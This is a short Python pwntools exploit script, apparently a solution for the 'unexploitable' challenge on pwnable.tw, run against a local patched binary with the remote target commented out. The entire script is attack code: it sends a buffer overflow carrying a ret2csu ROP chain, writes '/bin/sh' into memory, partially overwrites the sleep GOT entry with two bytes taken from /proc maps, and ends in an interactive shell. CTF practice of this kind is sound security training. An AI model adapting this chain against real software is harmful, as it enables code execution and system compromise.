from pwn import *

# r = remote('chall.pwnable.tw', 10403)
r = process('./unexploitable_patched')
bin = ELF('./unexploitable_patched')
libc = ELF('./libc.so.6')
context.clear(os='linux', arch='x86_64', log_level='DEBUG')

with open('/proc/%d/maps' % r.pid, 'r') as f:
    for _ in range(4):
        f.readline()
    two_bytes = (int('0x' + f.read(12), 16) + 0xcbbc0) & 0xffff
# two_bytes = 0x9bc0

csu = 0x00000000004005e6
csu2 = 0x00000000004005d0
binsh = 0x601100
ret = 0x0000000000400417

gdb.attach(r, ''''b execve''')
payload = b'a'*0x18 + p64(csu) + p64(0)*2 + p64(1) + \
        p64(bin.got['read']) + p64(0) + p64(binsh) + p64(0x7) + p64(csu2) + \
        b'\x00'*0x38 + p64(bin.symbols['main'])
sleep(1)
r.send(payload)
sleep(1)
r.send(b'/bin/sh')

payload = b'a'*0x18 + p64(csu) + p64(0)*2 + p64(1) + \
        p64(bin.got['read']) + p64(0) + p64(bin.got['sleep']) + p64(2) + p64(csu2) + \
        p64(0)*2 + p64(1) + p64(bin.got['sleep']) + p64(binsh) + p64(0)*2 + p64(csu2)
sleep(1)
r.send(payload)
sleep(1)
r.send(p16(two_bytes))
r.interactive()